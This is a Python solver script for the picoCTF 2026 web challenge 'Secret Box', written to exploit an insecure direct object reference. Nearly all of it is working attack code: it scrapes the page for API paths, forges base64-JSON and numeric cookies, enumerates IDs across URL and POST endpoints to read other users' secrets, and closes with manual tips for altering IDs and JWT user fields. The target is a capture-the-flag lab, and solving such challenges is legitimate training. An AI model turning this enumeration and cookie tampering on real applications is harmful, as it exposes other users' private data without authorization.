#!/usr/bin/env python3
"""
Secret Box - picoCTF 2026
Category: Web Exploitation | Points: 200

Automated IDOR exploitation script to enumerate other users' secrets
and find the flag.

Usage:
    pip install requests
    python3 solve.py

    Set environment variables to configure:
        TARGET_URL=http://<challenge_url> python3 solve.py
"""

import os
import sys
import re
import json
import base64
import requests
from urllib.parse import urljoin

# --- Configuration ---
TARGET_URL = os.environ.get("TARGET_URL", "http://rhea.picoctf.net:60506")
FLAG_PATTERN = re.compile(r"picoCTF\{[^}]+\}")

# Range of IDs to enumerate
ID_RANGE_START = int(os.environ.get("ID_START", "0"))
ID_RANGE_END = int(os.environ.get("ID_END", "100"))

# Common API endpoint patterns for IDOR vulnerabilities
ENDPOINT_PATTERNS = [
    "/api/secret?id={id}",
    "/api/secrets/{id}",
    "/api/box/{id}",
    "/api/box?id={id}",
    "/secret/{id}",
    "/secret?id={id}",
    "/box/{id}",
    "/box?id={id}",
    "/view?id={id}",
    "/view/{id}",
    "/api/user/{id}/secret",
    "/api/users/{id}/secret",
    "/api/v1/secrets/{id}",
]


def discover_endpoints(session, base_url):
    """Try to discover the correct API endpoint by testing common patterns."""
    print("[*] Discovering API endpoints...")

    # First, try to access the main page and look for API hints
    try:
        resp = session.get(base_url, timeout=10)
        body = resp.text

        # Look for JavaScript API calls, fetch URLs, etc.
        api_patterns = re.findall(r'["\'](/api/[^"\']+)["\']', body)
        fetch_patterns = re.findall(r'fetch\(["\']([^"\']+)["\']', body)
        href_patterns = re.findall(r'href=["\']([^"\']*(?:secret|box|view)[^"\']*)["\']', body)

        discovered = set(api_patterns + fetch_patterns + href_patterns)
        if discovered:
            print(f"[+] Discovered endpoints from page source: {discovered}")
            return list(discovered)
    except Exception as e:
        print(f"[!] Error accessing main page: {e}")

    # Try common paths to see which ones return non-404
    working_endpoints = []
    for pattern in ENDPOINT_PATTERNS:
        test_url = urljoin(base_url, pattern.format(id=1))
        try:
            resp = session.get(test_url, timeout=5)
            if resp.status_code != 404:
                print(f"[+] Endpoint responds ({resp.status_code}): {pattern}")
                working_endpoints.append(pattern)
        except Exception:
            pass

    return working_endpoints if working_endpoints else ENDPOINT_PATTERNS


def try_cookie_idor(session, base_url):
    """Check if the IDOR is in cookies rather than URL parameters."""
    print("\n[*] Checking for cookie-based IDOR...")

    # First, make a request to get cookies
    try:
        resp = session.get(base_url, timeout=10)
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

    cookies = session.cookies.get_dict()
    if not cookies:
        print("[-] No cookies set.")
        return None

    print(f"[*] Current cookies: {cookies}")

    for cookie_name, cookie_value in cookies.items():
        # Try to decode base64 cookies
        try:
            decoded = base64.b64decode(cookie_value).decode("utf-8", errors="ignore")
            print(f"[*] Cookie '{cookie_name}' base64 decoded: {decoded}")

            # Try to parse as JSON and modify user/id fields
            try:
                data = json.loads(decoded)
                for key in ["id", "user_id", "userId", "uid", "box_id", "boxId", "user", "secret_id"]:
                    if key in data:
                        original_val = data[key]
                        print(f"[*] Found modifiable field '{key}' = {original_val}")

                        # Try different IDs
                        for test_id in range(ID_RANGE_START, min(ID_RANGE_END, 50)):
                            data[key] = test_id
                            modified = base64.b64encode(
                                json.dumps(data).encode()
                            ).decode()
                            session.cookies.set(cookie_name, modified)

                            resp = session.get(base_url, timeout=5)
                            match = FLAG_PATTERN.search(resp.text)
                            if match:
                                print(f"\n[+] FLAG FOUND with {key}={test_id}: {match.group(0)}")
                                return match.group(0)

                        # Restore original
                        data[key] = original_val
            except json.JSONDecodeError:
                pass
        except Exception:
            pass

        # Try simple numeric cookie manipulation
        if cookie_value.isdigit():
            print(f"[*] Cookie '{cookie_name}' is numeric ({cookie_value}), trying IDOR...")
            for test_id in range(ID_RANGE_START, min(ID_RANGE_END, 50)):
                session.cookies.set(cookie_name, str(test_id))
                resp = session.get(base_url, timeout=5)
                match = FLAG_PATTERN.search(resp.text)
                if match:
                    print(f"\n[+] FLAG FOUND with {cookie_name}={test_id}: {match.group(0)}")
                    return match.group(0)

    return None


def try_url_idor(session, base_url, endpoints):
    """Try IDOR via URL parameter/path enumeration."""
    print("\n[*] Attempting URL-based IDOR enumeration...")

    for pattern in endpoints:
        print(f"\n[*] Testing endpoint pattern: {pattern}")
        for test_id in range(ID_RANGE_START, ID_RANGE_END + 1):
            url = urljoin(base_url, pattern.format(id=test_id))
            try:
                resp = session.get(url, timeout=5)

                if resp.status_code == 200:
                    match = FLAG_PATTERN.search(resp.text)
                    if match:
                        print(f"\n[+] FLAG FOUND at {url}: {match.group(0)}")
                        return match.group(0)

                    # Check for interesting content
                    if test_id <= 5:
                        try:
                            data = resp.json()
                            if data:
                                print(f"  [*] id={test_id}: {json.dumps(data)[:200]}")
                        except Exception:
                            if len(resp.text) > 10 and "error" not in resp.text.lower():
                                print(f"  [*] id={test_id}: {resp.text[:200]}")
                elif resp.status_code == 403:
                    if test_id <= 2:
                        print(f"  [*] id={test_id}: 403 Forbidden (auth check exists)")
                elif resp.status_code not in (404, 400):
                    if test_id <= 5:
                        print(f"  [*] id={test_id}: HTTP {resp.status_code}")

            except requests.exceptions.Timeout:
                continue
            except Exception as e:
                if test_id == ID_RANGE_START:
                    print(f"  [!] Error: {e}")
                    break

    return None


def try_post_idor(session, base_url):
    """Try IDOR via POST request body manipulation."""
    print("\n[*] Attempting POST-based IDOR...")

    post_endpoints = ["/api/secret", "/api/box", "/api/view", "/secret", "/box"]
    post_fields = ["id", "secret_id", "box_id", "user_id", "userId"]

    for endpoint in post_endpoints:
        url = urljoin(base_url, endpoint)
        for field in post_fields:
            for test_id in range(ID_RANGE_START, min(ID_RANGE_END, 20)):
                try:
                    # Try JSON body
                    resp = session.post(
                        url,
                        json={field: test_id},
                        timeout=5
                    )
                    if resp.status_code == 200:
                        match = FLAG_PATTERN.search(resp.text)
                        if match:
                            print(f"\n[+] FLAG FOUND via POST {url} {{{field}: {test_id}}}: {match.group(0)}")
                            return match.group(0)

                    # Try form body
                    resp = session.post(
                        url,
                        data={field: test_id},
                        timeout=5
                    )
                    if resp.status_code == 200:
                        match = FLAG_PATTERN.search(resp.text)
                        if match:
                            print(f"\n[+] FLAG FOUND via POST {url} {field}={test_id}: {match.group(0)}")
                            return match.group(0)
                except Exception:
                    break

    return None


def main():
    print("=" * 60)
    print("  Secret Box - picoCTF 2026 Solver")
    print("  Category: Web Exploitation | Points: 200")
    print("=" * 60)
    print(f"  Target: {TARGET_URL}")
    print(f"  ID Range: {ID_RANGE_START} - {ID_RANGE_END}")
    print()

    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    })

    # Phase 1: Discover endpoints
    endpoints = discover_endpoints(session, TARGET_URL)

    # Phase 2: Try cookie-based IDOR
    flag = try_cookie_idor(session, TARGET_URL)
    if flag:
        print(f"\n{'='*60}")
        print(f"  FLAG: {flag}")
        print(f"{'='*60}")
        return

    # Phase 3: Try URL-based IDOR
    flag = try_url_idor(session, TARGET_URL, endpoints)
    if flag:
        print(f"\n{'='*60}")
        print(f"  FLAG: {flag}")
        print(f"{'='*60}")
        return

    # Phase 4: Try POST-based IDOR
    flag = try_post_idor(session, TARGET_URL)
    if flag:
        print(f"\n{'='*60}")
        print(f"  FLAG: {flag}")
        print(f"{'='*60}")
        return

    print("\n[-] Flag not found automatically.")
    print("[*] Manual investigation tips:")
    print("    1. Open the challenge URL in a browser")
    print("    2. Create an account and store a secret")
    print("    3. Use Browser DevTools (F12 > Network tab) to observe API calls")
    print("    4. Look for sequential IDs in URLs, cookies, or request bodies")
    print("    5. Modify the ID to access other users' secrets")
    print("    6. Check for JWT tokens: decode at jwt.io and modify the user ID")
    print(f"    7. Try: curl {TARGET_URL}/api/secret?id=0")


if __name__ == "__main__":
    main()
